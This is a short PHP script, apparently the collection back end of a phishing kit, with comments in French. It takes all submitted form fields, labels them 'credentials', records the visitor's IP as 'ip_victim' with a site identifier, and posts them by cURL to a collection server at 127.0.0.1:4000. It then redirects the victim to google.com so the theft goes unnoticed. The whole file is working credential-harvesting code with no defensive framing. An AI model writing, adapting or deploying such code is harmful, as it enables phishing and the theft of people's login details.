<?php

$url = "http://127.0.0.1:4000";
$ip_victim = $_SERVER['REMOTE_ADDR'];

$siteIdPath = 'site_id.txt';
if (file_exists($siteIdPath)) {
    $siteId = file_get_contents($siteIdPath);
}
else{
    $siteId = "NaN";
}

$domainPath = 'domain_name.txt';
if (file_exists($domainPath)) {
    $domain = file_get_contents($domainPath);
}
else{
    $domain = "NaN";
}

if ($_SERVER["REQUEST_METHOD"]==='POST') $keys = $_POST;
if ($_SERVER["REQUEST_METHOD"]==='GET') $keys = $_GET;

$data = json_encode([
    'site_id' => $siteId,
    'credentials' => json_encode($keys),
    'ip_victim' => $ip_victim
]);


// Initialisation de cURL
$ch = curl_init();

// Configuration des options de cURL
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true); // Méthode POST
curl_setopt($ch, CURLOPT_POSTFIELDS, $data); // Données envoyées
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Retourne la réponse en tant que chaîne
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data)
]);

// Exécution de la requête cURL
$response = curl_exec($ch);

// Vérification d'éventuelles erreurs
if(curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}

// Fermeture de la session cURL
curl_close($ch);

header('location:https://google.com');
exit();